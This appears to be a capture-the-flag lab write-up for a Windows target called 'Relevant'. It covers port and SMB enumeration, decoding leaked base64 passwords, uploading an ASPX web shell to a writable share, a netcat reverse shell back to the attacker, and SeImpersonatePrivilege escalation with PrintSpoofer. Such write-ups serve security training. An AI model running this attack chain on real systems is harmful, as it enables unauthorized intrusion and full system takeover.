# Relevant
## Table of Contents
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
  * [Operating System](#operating-system)
  * [Web Browsing](#web-browsing)
  * [Web Crawling](#web-crawling)
  * [SMB Browsing](#smb-browsing)
  * [Vulnerability Scanning](#vulnerability-scanning)
* [Exploit](#exploit)
* [Explore](#explore)
* [Escalate](#escalate)

## Enumerate
### Ports
An initial Nmap port scan discovered TCP ports 80, 135, 445, 139, 445, and 3389 were open.
```bash
sudo nmap 10.10.225.154 -sS -sU --min-rate 1000 -oA relevant-open-ports-initial

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 05:21 MDT
Nmap scan report for 10.10.225.154
Host is up (0.23s latency).
Not shown: 1000 open|filtered ports, 995 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 5.89 seconds
```

A scan of all TCP and UDP ports identified 49663 open as well.  
```bash
sudo nmap 10.10.22.113 -sS -sU -p- --min-rate 1000 -oA relevant-open-ports-all

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 05:24 MDT
Nmap scan report for 10.10.225.154
Host is up (0.22s latency).
Not shown: 65535 open|filtered ports, 65529 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 263.49 seconds
```

I used Netcat to verify Nmap's results. 
```bash
nc -nzv 10.10.71.98 80
(UNKNOWN) [10.10.71.98] 80 (http) open

nc -nzv 10.10.71.98 135
(UNKNOWN) [10.10.71.98] 135 (epmap) open

nc -nzv 10.10.71.98 139
(UNKNOWN) [10.10.71.98] 139 (netbios-ssn) open

nc -nzv 10.10.71.98 445
(UNKNOWN) [10.10.71.98] 445 (microsoft-ds) open

nc -nzv 10.10.71.98 3389
(UNKNOWN) [10.10.71.98] 3389 (ms-wbt-server) open

nc -nzv 10.10.71.98 49663
(UNKNOWN) [10.10.71.98] 49663 (?) open
```

### Services
Nmap determined the target is running the following service versions:
* Microsoft IIS httpd 10.0
* Microsoft Windows RPC
* Microsoft Windows netbios-ssn
* Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
* Microsoft Terminal Services
* Microsoft IIS httpd 10.0

```bash
sudo nmap 10.10.225.154 -sS -p T:80,135,139,445,3389,49663 -sV -oA relevant-serviceversions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 05:34 MDT
Nmap scan report for 10.10.225.154
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.17 seconds
```

### Operating System
```bash
sudo nmap 10.10.39.215 -O -oA relevant-os

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 07:19 MDT
Nmap scan report for 10.10.39.215
Host is up (0.21s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.02 seconds
```

### Web Browsing
Browsing to TCP port 80 produced a Windows IIS server landing page. 
```bash
firefox http://10.10.225.154
```

### Web Crawling
Dirsearch was unable to identify anything of value aside from getting a few HTTP 403 response codes. 
```bash
python3 dirsearch/dirsearch.py -u 10.10.225.154 --simple-report relevant-tcp80-webcrawl.txt

# output
[05:57:36] 403 -  312B  - /%2e%2e//google.com
[05:57:54] 403 -    2KB - /Trace.axd                                                                                                    
[05:57:56] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
```

Dirsearch discovered directory of interest on TCP port 49663.
```bash
python3 dirsearch/dirsearch.py -u 10.10.225.154:49663 --simple-report relevant-tcp49663-webcrawl.txt

# output
403   312B   http://10.10.225.154:49663/%2e%2e//google.com
403     2KB  http://10.10.225.154:49663/Trace.axd
403   312B   http://10.10.225.154:49663/\..\..\..\..\..\..\..\..\..\etc\passwd
301   164B   http://10.10.225.154:49663/aspnet_client    -> REDIRECTS TO: http://10.10.225.154:49663/aspnet_client/
200     0B   http://10.10.225.154:49663/aspnet_client/
```

### SMB Browsing
Discovered four shares.
```bash
smbclient -L //10.10.225.154

# output
Enter WORKGROUP\victor's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

Discovered an interesting file one a share called "nt4wrksv."
```bash
smbclient //10.10.225.154/nt4wrksv
dir

# output
.                                   D        0  Sat Jul 25 15:46:04 2020
..                                  D        0  Sat Jul 25 15:46:04 2020
passwords.txt                       A       98  Sat Jul 25 09:15:33 2020

              7735807 blocks of size 4096. 5136985 blocks available
```

Viewed file from interesting share, provided encoded passwords. 
```bash
smbclient //10.10.225.154/nt4wrksv
more passwords.txt

# more
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Decoded the strings from the "passwords.txt" file. 
```bash
echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 --decode
Bob - !P@$$W0rD!123 # output

echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 --decode
Bill - Juw4nnaM4n420696969!$$$ # output
```

Smbmap (Bob)
```bash
smbmap -u bob -p '!P@$$W0rD!123' -H 10.10.71.98

# output
[+] IP: 10.10.71.98:445 Name: 10.10.71.98                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        nt4wrksv                                                READ, WRITE
```

### Vulnerability Scanning
HTTP
```bash
nikto -h 10.10.71.98 -Format txt -o relevant-nikto.txt

# output
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.71.98
+ Target Port: 80
+ GET Retrieved x-powered-by header: ASP.NET
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Retrieved x-aspnet-version header: 4.0.30319
+ OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.219.77
+ Target Port: 49663
+ GET Retrieved x-powered-by header: ASP.NET
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Retrieved x-aspnet-version header: 4.0.30319
+ OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
```

SMB
```bash
sudo nmap 10.10.225.154 --script smb-enum-* -p445 -oA relevant-smb-enumeration

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 05:59 MDT
Nmap scan report for 10.10.225.154
Host is up (0.21s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-sessions: 
|_  <nobody>
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.225.154\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.225.154\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.225.154\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.225.154\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 70.54 seconds
```

## Exploit
Uploading a web shell to the "nt4wrksv" share.
```bash
# on the attacker side
mkdir /mnt/relevant
sudo mount //10.10.59.193/nt4wrksv /mnt/relevant -o username=bob
cp /usr/share/webshells/aspx/cmdasp.aspx /mnt/relevant
```

Using the web shell to invoke a reverse shell. 
```
# on the attacker side
cp /usr/share/windows-binaries/nc.exe /mnt/relevant
firefox http://10.10.88.43:49663/nt4wrksv/cmdasp.aspx
sudo nc -nvlp 443

# within the web shell (at the URL above)
dir
powershell.exe -c "C:\inetpub\wwwroot\nt4wrksv\nc.exe -e cmd.exe 443 10.2.76.52"
```

## Explore
```bash
# on the victim side, via the reverse shell
more C:\Users\Bob\Desktop\user.txt # first flag
```

## Escalate
Identify privileges of the current user. 
```
# on the victim side, via the reverse shell
whoami /priv

# output
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Abusing the SeImpersonatePrivilege. 
```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
sudo cp PrintSpoofer64.exe /mnt/relevant
.\PrintSpoofer64.exe -i -c powershell.exe
more C:\Users\Administrator\Desktop\root.txt # second flag
```
